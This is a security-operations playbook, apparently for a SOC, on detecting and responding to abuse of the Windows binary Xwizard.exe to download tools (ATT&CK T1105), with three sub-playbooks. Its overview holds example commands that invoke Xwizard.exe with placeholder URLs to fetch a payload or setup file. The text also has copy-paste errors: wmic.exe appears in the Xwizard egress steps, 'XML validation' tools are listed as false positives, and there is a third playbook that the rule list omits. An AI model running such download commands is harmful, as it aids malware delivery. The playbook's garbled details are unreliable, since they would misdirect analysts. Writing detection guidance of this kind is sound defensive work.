
# T1105 — Ingress Tool Transfer · LOLBin: Xwizard.exe (Installer for Windows Wizards)
**Rules Covered:**  
- CNC-E-2726320-190 — Xwizard URL Connection (Process Creation)  
- CNC-E-2726320-191 — Xwizard Egress (Sysmon EID 3)  
**Last updated:** 2025-10-10

> `Xwizard.exe` is a binary used by Windows to run wizards or setup programs. If misused by attackers, it can be invoked with remote **URLs** in the command line to download files 
> for **T1105** ingress tool transfer. It might also attempt **egress** connections to external locations as part of a malicious setup process.

---

## Playbook 1 — Xwizard URL Connection (Process Creation)

### Overview
Investigate **process creation** where `Xwizard.exe` is invoked with a **URL** in the command line.
Examples:
- `Xwizard.exe http://example.com/payload.zip`
- `Xwizard.exe https://malicious.com/setup.exe`

### Initial Response
1. **Preserve context:** Export **Sysmon EID 1 / Security 4688** showing full `CommandLine`, `ParentImage`, `User`, and timestamp.  
2. **Parse command line:** Identify **remote URLs** and **raw IPs**; classify sources as **internal or external**.  
3. **Secure artifacts:** Snapshot **%TEMP%**, **AppData**, and related directories for any created files.

### Investigation Steps
#### 1) Process & Lineage
- Validate `Image` path/signature (`C:\\Windows\\System32\\Xwizard.exe`).  
- Review **parent process** and **user context**.

#### 2) Command‑Line Analysis
- Check for **URLs**, **IP addresses**, and unusual **command-line switches** (`-file`, `-source`, etc.).

#### 3) Network & DNS
- Correlate **Sysmon EID 3** for network egress associated with `Xwizard.exe`.  
- Use **Sysmon EID 22** for DNS lookups linked to unusual or external domains/IPs.

#### 4) Artifact & Execution
- Review **Sysmon EID 11** for downloaded files or modified caches.  
- Look for **follow‑on execution** from downloaded files.

### Key Artifacts
- **Sysmon EID 1 / 4688:** Full process creation context with the command line.  
- **Sysmon EID 3:** Network connections attributed to `Xwizard.exe`.  
- **Sysmon EID 22:** DNS queries tied to external sources.  
- **Sysmon EID 11:** Files created in **%TEMP%**, **AppData**.

### Containment Actions
- **Block** suspicious destinations; **quarantine** downloaded content; **terminate** any related processes.  
- Consider **host isolation** if malicious activity is confirmed.

### Prevention Measures
- **AppLocker/WDAC** to limit execution of `Xwizard.exe` outside authorized contexts.  
- Restrict **URLs** used by setup applications and **monitor** network traffic for **unexpected outbound connections**.

### Recovery
- Remove malicious files, restore **%TEMP%**, and **AppData** from secure backups.  
- Adjust detection rules to cover further potential abuse of `Xwizard.exe`.

### False Positives
- **Legitimate installer activity**, especially in environments where **intranet setup** URLs are used.

---

## Playbook 2 — Xwizard Egress (Sysmon EID 3)

### Overview
Investigate **Sysmon EID 3** for unexpected **network connections** initiated by `Xwizard.exe`. These outbound connections could indicate an attempt to **download** or **upload files**, corresponding to **T1105**.

### Initial Response
1. **Preserve context:** Export **Sysmon EID 3** showing **destination IPs**/ports, associated `wmic.exe` processes, and timestamps.  
2. **Correlate with command line:** Ensure that the **network activity** matches the **URLs**/IPs identified in the previous playbook.  
3. **Monitor for unusual destinations:** Look for **external IPs** or **non‑standard ports** being accessed.

### Investigation Steps
#### 1) Network & Destination
- Analyze **destination IPs**, **ports**, and **protocols** involved.  
- Validate **external destinations** or **IP addresses** related to non‑enterprise sources.

#### 2) Correlation with DNS and Process Creation
- Use **Sysmon EID 22** to check for **DNS queries** related to the external destinations.
- Correlate with **Sysmon EID 1** for the parent process that launched `Xwizard.exe`.

#### 3) Artifact Discovery
- Review **Sysmon EID 11** for any files that were downloaded or modified as a result of the network connection.  
- Check for **follow‑on processes** triggered by the network activity (e.g., downloaded payloads executed by `cmd.exe`, `powershell.exe`).

### Key Artifacts
- **Sysmon EID 3:** Network connections attributed to `Xwizard.exe`.  
- **Sysmon EID 22:** DNS lookups for external sources.  
- **Sysmon EID 11:** Files created in **%TEMP%**, **AppData**, or other directories.

### Containment Actions
- **Block** destinations/IPs; **quarantine** any downloaded files; **terminate** related processes.  
- Consider **host isolation** for confirmation of malicious activity.

### Prevention Measures
- **AppLocker/WDAC** to limit the execution of `Xwizard.exe` to trusted processes.  
- Use **firewall** and **network segmentation** to block non‑approved outbound connections.

### Recovery
- Remove any downloaded payloads and reset affected file paths.
- **Restore** files from trusted sources if necessary.

### False Positives
- Legitimate **network management** tools or **XML file validation** tools using external IPs or URLs.

---

## Playbook 3 — Xwizard DNS Lookup Anomaly (Sysmon EID 22)

### Overview
Investigate **DNS queries** triggered by `Xwizard.exe` for **unusual or external domains/IPs**, particularly if the **DNS query** does not align with enterprise network infrastructure. **T1105** often involves downloading files from non‑standard sources.

### Initial Response
1. **Preserve context:** Export **Sysmon EID 22** DNS queries attributed to `Xwizard.exe`, noting the **domains/IPs** and timestamps.  
2. **Correlate with network traffic:** Check **Sysmon EID 3** for network traffic initiated by `Xwizard.exe` or related processes.
3. **Enrich the source:** Lookup **IP reputation** and domain ownership.

### Investigation Steps
#### 1) DNS Query Analysis
- Identify any **DNS anomalies**, such as newly seen domains, non‑enterprise names, or IP addresses.
- Validate DNS resolution through **external sources** or **untrusted domains**.

#### 2) Network Activity
- Correlate **Sysmon EID 3** for network traffic initiated by `Xwizard.exe` or related processes.
- Check for **file transfers** or command execution associated with DNS resolution.

#### 3) Artifact & Execution
- Review **Sysmon EID 11** for any files associated with these external network resources.  
- Check for **follow‑on execution** by any **malicious payloads**.

### Key Artifacts
- **Sysmon EID 22:** DNS queries and associated domains/IPs.
- **Sysmon EID 3:** Network connections to external sources.
- **Sysmon EID 11:** File creation and modification.

### Containment Actions
- **Block** suspicious IP addresses and **terminate** processes involving remote file access.  
- **Isolate** affected machines if malicious activity is confirmed.

### Prevention Measures
- **Use DNS filtering** and **network monitoring** to identify suspicious connections early.  
- Limit access to **external DNS** servers.

### Recovery
- Review and **restore** DNS configurations, files, and network connections.  
- **Tune** detection rules to reduce false positives from internal services.

### False Positives
- Legitimate **XML validation services** or **external resources** used by trusted applications or scripts.
